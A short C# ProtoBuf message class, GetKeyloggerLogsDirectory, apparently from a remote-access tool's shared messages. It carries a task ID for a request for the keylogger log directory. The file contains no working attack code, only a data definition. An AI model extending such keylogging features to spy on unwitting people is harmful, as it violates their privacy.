using ProtoBuf;

namespace Quasar.Common.Messages
{
    [ProtoContract]
    public class GetKeyloggerLogsDirectory : IMessage
    {
        [ProtoMember(1)]
        public string TaskId { get; set; }
    }
}
